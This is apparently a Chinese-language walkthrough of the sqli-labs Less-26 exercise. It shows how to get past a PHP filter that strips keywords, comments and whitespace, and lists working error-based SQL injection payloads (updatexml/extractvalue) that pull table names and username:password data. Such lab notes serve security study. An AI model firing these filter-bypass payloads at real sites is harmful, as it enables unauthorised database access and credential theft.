# Less-26 基于错误的空间过滤+注释过滤

查看分析源码
```php
$id= preg_replace('/or/i',"", $id);      // 去掉 or
$id= preg_replace('/and/i',"", $id);     // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);   // 去掉 /*
$id= preg_replace('/[--]/',"", $id);     // 去掉 --
$id= preg_replace('/[#]/',"", $id);      // 去掉 #
$id= preg_replace('/[\s]/',"", $id);     // 去掉空格 Tab 换行
$id= preg_replace('/[\/\\\\]/',"", $id); // 去掉 / 和 \
```

or 和 and 被替换为空 → 双写 oorr / aandnd
-- 和 # 被去掉 → 不能用注释
空格 \s 被去掉 → 空格 Tab 换行全废
/ 和 \ 被去掉 → /**/ 内联注释废了

解决：
or → ||（或 oorr 双写）
and → &&（URL编码 %26%26）或 aandnd 双写
空格 → 用 () 包裹替代
注释 → 用报错注入，|| 做条件拼接。也可以用 ;%00 截断更干净

举例：
select 1,2,3 from users where id='1'
用 () 的话：
select(1),(2),(3)from(users)where(id='1')

注意点：|| 是 or，&& 是 and，MySQL里 || 默认识别为 or

报错注入不需要 UNION，`updatexml` 和 `extractvalue` 都能爆，后者少一个参数：

```
#updatexml（三个参数）
updatexml(1,concat(0x7e,子查询),1)

#extractvalue（两个参数，短一点）
extractvalue(1,concat(0x7e,子查询))
```

`limit(N,1)` 带括号语法有问题 → 用 `where(id=N)` 逐行定位

#爆库名
?id=1'||updatexml(1,concat(0x7e,database()),1)||'1

#爆表名（子查询放 updatexml 里，infoorrmation_schema 双写）
?id=1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1)||'1

#爆字段（and 用 %26%26）
?id=1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()%26%26table_name='users'))),1)||'1

#爆数据（逐行定位）
?id=1'||updatexml(1,concat(0x7e,(select(concat(username,':',passwoorrd))from(users)where(id=1))),1)||'1

where(id=N) 逐个收，`: ` 分割用户名和密码。password 里的 or 双写 passwoorrd。

也可以用 ;%00 代替尾部 ||'1 闭合：
?id=1'||extractvalue(1,concat(0x7e,(select(concat(username,':',passwoorrd))from(users)where(id=1))));%00
![](99_Attachments/图片/Less-26/file-20260615200911346.png)
![](99_Attachments/图片/Less-26/file-20260615200934876.png)